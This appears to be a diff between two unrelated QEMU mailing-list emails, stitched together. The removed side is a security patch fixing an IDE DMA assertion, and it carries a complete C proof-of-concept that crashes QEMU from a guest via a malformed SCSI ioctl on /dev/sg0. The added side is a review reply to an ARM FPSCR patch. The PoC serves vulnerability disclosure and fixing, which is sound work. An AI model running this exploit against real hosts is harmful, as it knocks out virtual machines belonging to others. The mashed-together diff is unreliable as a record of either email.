@@ -2,59 +2,66 @@ Return-Path: <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
 X-Original-To: lists+qemu-devel@lfdr.de
 Delivered-To: lists+qemu-devel@lfdr.de
 Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
-	by mail.lfdr.de (Postfix) with ESMTPS id C41C66082B
-	for <lists+qemu-devel@lfdr.de>; Fri,  5 Jul 2019 16:44:50 +0200 (CEST)
-Received: from localhost ([::1]:53844 helo=lists1p.gnu.org)
+	by mail.lfdr.de (Postfix) with ESMTPS id EB173607AE
+	for <lists+qemu-devel@lfdr.de>; Fri,  5 Jul 2019 16:17:50 +0200 (CEST)
+Received: from localhost ([::1]:53624 helo=lists1p.gnu.org)
 	by lists.gnu.org with esmtp (Exim 4.86_2)
 	(envelope-from <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>)
-	id 1hjPSE-0006oi-1A
-	for lists+qemu-devel@lfdr.de; Fri, 05 Jul 2019 10:44:50 -0400
-Received: from eggs.gnu.org ([2001:470:142:3::10]:46200)
+	id 1hjP26-0000Ye-4s
+	for lists+qemu-devel@lfdr.de; Fri, 05 Jul 2019 10:17:50 -0400
+Received: from eggs.gnu.org ([2001:470:142:3::10]:46835)
  by lists.gnu.org with esmtp (Exim 4.86_2)
- (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOsr-0001A0-2R
- for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:19 -0400
+ (envelope-from <laurent.desnogues@gmail.com>) id 1hjOv9-0003JD-1i
+ for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:10:41 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
- (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOso-0006X0-8M
- for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:15 -0400
-Received: from mail-lf1-f66.google.com ([209.85.167.66]:41390)
+ (envelope-from <laurent.desnogues@gmail.com>) id 1hjOv8-0008Mv-0Q
+ for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:10:38 -0400
+Received: from mail-io1-xd43.google.com ([2607:f8b0:4864:20::d43]:41514)
  by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
- (Exim 4.71) (envelope-from <a13xp0p0v88@gmail.com>)
- id 1hjOsi-0005Yo-DH; Fri, 05 Jul 2019 10:08:09 -0400
-Received: by mail-lf1-f66.google.com with SMTP id 62so6422907lfa.8;
- Fri, 05 Jul 2019 07:08:01 -0700 (PDT)
+ (Exim 4.71) (envelope-from <laurent.desnogues@gmail.com>)
+ id 1hjOv7-0007hn-Ml; Fri, 05 Jul 2019 10:10:37 -0400
+Received: by mail-io1-xd43.google.com with SMTP id j5so19070ioj.8;
+ Fri, 05 Jul 2019 07:10:31 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20161025;
+ h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+ :cc:content-transfer-encoding;
+ bh=jc8T6B1sYMgE8KUu3r8iCtOxhFzftBC0DO27E9t5POg=;
+ b=tyL3hlikgB7h11DqJBXwuvH1+JMnWTh2xDiNBC/IEwBdd1G6UxmyHfDcWRclCr4OPL
+ WGlaPixlePBhQzKgbBNrMvj+a3PtJlAvyOisdABzL1cqS+ZjhhJwsEHMipfeAUzH+6fW
+ EpIj8DZL74u/8uKgoI3ZKhpQrdk1YBZwe4sba8xlIkOxiz4phnwIp6nTSyM55dRV9W2Q
+ Wv2svVhyMFggrQ0a9BLg9zVx8BJ07DQ48muqSckgK0s+vmqjK0g+Ndp29yBQ1t8s/2hl
+ 0O7HiiMSABZLCveKMDOq+0mNSd0voyx+MdyPd6MEMaY/vAu31+5YtK7Bp7yrfqcnehhU
+ UOiw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=1e100.net; s=20161025;
- h=x-gm-message-state:from:to:subject:date:message-id;
- bh=isMJDTAnfZgWdLOw8d367N2Ss2BSvcqEi2CrNYGG5dM=;
- b=ozJRLeWD3b2wGRC5EUhCGJyBwOCe6oxkGPVPu7z0C1ZUtWLNzPZEDS8rKRuax+fYxu
- 3TnGQgPWaCErTFzcVCgNfBpCNDCNOHtTBHUzyg2hH0ASKfHPz1MV/BO+0Uli9/RzTggS
- 9um4j4Y7sCpPg5eXBdj4xGlM9y7eifKRfzG7l6DeRj4vkfQBaMNnYhOvctV2f9B6eA4C
- j8pK4+lLOxZ+xa1GhpjAXnbdLmjGW6UpHL1kVhYTDw0eHyk+LFZcuJuzlf37SywmGNZ6
- WUyPuuUJEy+KQa48sUwWMB/pGLyBIlHTv6fvIl2rVJV21ni3kexjzCOHyV7cX6ycM6gX
- 1/ew==
-X-Gm-Message-State: APjAAAVdlnj39vlc7yQUtWcCqzg5r0ULU/l95dhbW5PlS5AS2u1yqMVl
- 6+UlV7ZHfXQna32ksFJ2pPM=
-X-Google-Smtp-Source: APXvYqx4GrlhQWRxzNKozoRLB24nQhBogFgYgJc9OPAkM0JAAayatoCnuq8RrJGKT9H8j+CQbCop4A==
-X-Received: by 2002:a19:ec15:: with SMTP id b21mr2311417lfa.32.1562335680324; 
- Fri, 05 Jul 2019 07:08:00 -0700 (PDT)
-Received: from hobbit.lan (95-28-29-40.broadband.corbina.ru. [95.28.29.40])
- by smtp.gmail.com with ESMTPSA id p21sm1098298lfc.41.2019.07.05.07.07.58
- (version=TLS1_2 cipher=ECDHE-RSA-AES128-SHA bits=128/128);
- Fri, 05 Jul 2019 07:07:59 -0700 (PDT)
-From: Alexander Popov <alex.popov@linux.com>
-To: John Snow <jsnow@redhat.com>, qemu-block@nongnu.org, qemu-devel@nongnu.org,
- qemu-stable@nongnu.org, mst@redhat.com, pmatouse@redhat.com,
- sstabellini@kernel.org, mdroth@linux.vnet.ibm.com, pjp@redhat.com,
- alex.popov@linux.com
-Date: Fri,  5 Jul 2019 17:07:49 +0300
-Message-Id: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
-X-Mailer: git-send-email 2.7.4
-X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
- [fuzzy]
-X-Received-From: 209.85.167.66
-X-Mailman-Approved-At: Fri, 05 Jul 2019 10:42:17 -0400
-Subject: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to
- prevent qemu DoS from quest
+ h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+ :message-id:subject:to:cc:content-transfer-encoding;
+ bh=jc8T6B1sYMgE8KUu3r8iCtOxhFzftBC0DO27E9t5POg=;
+ b=X86y5N9flKx5B645lIqoXsOLwvZEc5YxLJpdd5MbJWaQfILYnOGWSQH4sc+hO/O3bv
+ 2IZUC5mOx2srdtbb2hcD3dZHvFQhmxp5j7hOyQIx2gVjfzBMEnjTaN0qbaqk+WX3yeSd
+ KjCSdfQeYwH9E9LkEPEBAAVylqHw5vWwyMNGCjOYkJ4TBd35F19X4Q1cc3b9R+0Ki3xg
+ GZXnb5u6K8VkHJHpyeMwJhFqOgWsCVsvZKPHt68Re0yuoRZzk08FV+A40A4bBwJkM5Kb
+ iRzFR0laJVXYyYmHCVNeoKEAiEorm3/GpwGkZXf4vfjjC7i/wWKRxo/O2c3p7cLkxqVw
+ tk5Q==
+X-Gm-Message-State: APjAAAXIylSBLuwZmNGiJhH17DoUGN/oSmBznfuwzQC5sdbCxW8hi5mY
+ 7XR7AtI+RIHk5T62hsc9vumJ9Nfvu7mtjYc329s=
+X-Google-Smtp-Source: APXvYqw498Icl14jRiBkwlADDXenfHTPtE0s9hLvZO1diJiBgjG12GHUUUc/aR3ZyCJaFgHxH5+1DSeq2xvT9WUbiHw=
+X-Received: by 2002:a02:ab83:: with SMTP id t3mr4830212jan.133.1562335828673; 
+ Fri, 05 Jul 2019 07:10:28 -0700 (PDT)
+MIME-Version: 1.0
+References: <20190705124318.1075-1-philmd@redhat.com>
+In-Reply-To: <20190705124318.1075-1-philmd@redhat.com>
+From: Laurent Desnogues <laurent.desnogues@gmail.com>
+Date: Fri, 5 Jul 2019 16:10:27 +0200
+Message-ID: <CABoDooNn3HzrgDd3sreGDogFE=_L26=si-ddkeZ6paeoMF+v6w@mail.gmail.com>
+To: =?UTF-8?Q?Philippe_Mathieu=2DDaud=C3=A9?= <philmd@redhat.com>
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+X-detected-operating-system: by eggs.gnu.org: Genre and OS details not
+ recognized.
+X-Received-From: 2607:f8b0:4864:20::d43
+Subject: Re: [Qemu-devel] [PATCH] target/arm/vfp_helper: Call
+ set_fpscr_to_host before updating to FPSCR
 X-BeenThere: qemu-devel@nongnu.org
 X-Mailman-Version: 2.1.23
 Precedence: list
@@ -66,91 +73,61 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
  <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
+Cc: Peter Maydell <peter.maydell@linaro.org>, qemu-arm <qemu-arm@nongnu.org>,
+ =?UTF-8?B?QWxleCBCZW5uw6ll?= <alex.bennee@linaro.org>,
+ "qemu-devel@nongnu.org" <qemu-devel@nongnu.org>
 Errors-To: qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org
 Sender: "Qemu-devel" <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
 
-This assertion was introduced in the commit a718978ed58a in July 2015.
-It implies that the size of successful DMA transfers handled in
-ide_dma_cb() should be multiple of 512 (the size of a sector).
+On Fri, Jul 5, 2019 at 2:43 PM Philippe Mathieu-Daud=C3=A9 <philmd@redhat.c=
+om> wrote:
+>
+> In commit e9d652824b0 we extracted the vfp_set_fpscr_to_host()
+> function but failed at calling it in the correct place, we call
+> it after xregs[ARM_VFP_FPSCR] is modified.
+>
+> Fix by calling this function before we update FPSCR.
+>
+> Reported-by: Laurent Desnogues <laurent.desnogues@gmail.com>
+> Signed-off-by: Philippe Mathieu-Daud=C3=A9 <philmd@redhat.com>
 
-But guest systems can initiate DMA transfers that don't fit this
-requirement. Let's improve the assertion to prevent qemu DoS from quests.
+Reviewed-by: Laurent Desnogues <laurent.desnogues@gmail.com>
+Tested-by: Laurent Desnogues <laurent.desnogues@gmail.com>
 
-PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
-command and crash qemu:
+Thanks,
 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <stdint.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <string.h>
-#include <stdlib.h>
-#include <scsi/scsi.h>
-#include <scsi/scsi_ioctl.h>
+Laurent
 
-#define CMD_SIZE 2048
-
-struct scsi_ioctl_cmd_6 {
-	unsigned int inlen;
-	unsigned int outlen;
-	unsigned char cmd[6];
-	unsigned char data[];
-};
-
-int main(void)
-{
-	intptr_t fd = 0;
-	struct scsi_ioctl_cmd_6 *cmd = NULL;
-
-	cmd = malloc(CMD_SIZE);
-	if (!cmd) {
-		perror("[-] malloc");
-		return 1;
-	}
-
-	memset(cmd, 0, CMD_SIZE);
-	cmd->inlen = 1337;
-	cmd->cmd[0] = READ_6;
-
-	fd = open("/dev/sg0", O_RDONLY);
-	if (fd == -1) {
-		perror("[-] opening sg");
-		return 1;
-	}
-
-	printf("[+] sg0 is opened\n");
-
-	printf("[.] qemu should break here:\n");
-	fflush(stdout);
-	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
-	printf("[-] qemu didn't break\n");
-
-	free(cmd);
-
-	return 1;
-}
-
-Signed-off-by: Alexander Popov <alex.popov@linux.com>
----
- hw/ide/core.c | 2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
-
-diff --git a/hw/ide/core.c b/hw/ide/core.c
-index 6afadf8..304fe69 100644
---- a/hw/ide/core.c
-+++ b/hw/ide/core.c
-@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
- 
-     sector_num = ide_get_sector(s);
-     if (n > 0) {
--        assert(n * 512 == s->sg.size);
-+        assert(n == s->sg.size / 512);
-         dma_buf_commit(s, s->sg.size);
-         sector_num += n;
-         ide_set_sector(s, sector_num);
--- 
-2.7.4
-
+> ---
+>  target/arm/vfp_helper.c | 4 ++--
+>  1 file changed, 2 insertions(+), 2 deletions(-)
+>
+> diff --git a/target/arm/vfp_helper.c b/target/arm/vfp_helper.c
+> index 46041e3294..9710ef1c3e 100644
+> --- a/target/arm/vfp_helper.c
+> +++ b/target/arm/vfp_helper.c
+> @@ -197,6 +197,8 @@ void HELPER(vfp_set_fpscr)(CPUARMState *env, uint32_t=
+ val)
+>          val &=3D 0xf7c0009f;
+>      }
+>
+> +    vfp_set_fpscr_to_host(env, val);
+> +
+>      /*
+>       * We don't implement trapped exception handling, so the
+>       * trap enable bits, IDE|IXE|UFE|OFE|DZE|IOE are all RAZ/WI (not RES=
+0!)
+> @@ -217,8 +219,6 @@ void HELPER(vfp_set_fpscr)(CPUARMState *env, uint32_t=
+ val)
+>      env->vfp.qc[1] =3D 0;
+>      env->vfp.qc[2] =3D 0;
+>      env->vfp.qc[3] =3D 0;
+> -
+> -    vfp_set_fpscr_to_host(env, val);
+>  }
+>
+>  void vfp_set_fpscr(CPUARMState *env, uint32_t val)
+> --
+> 2.20.1
+>
 
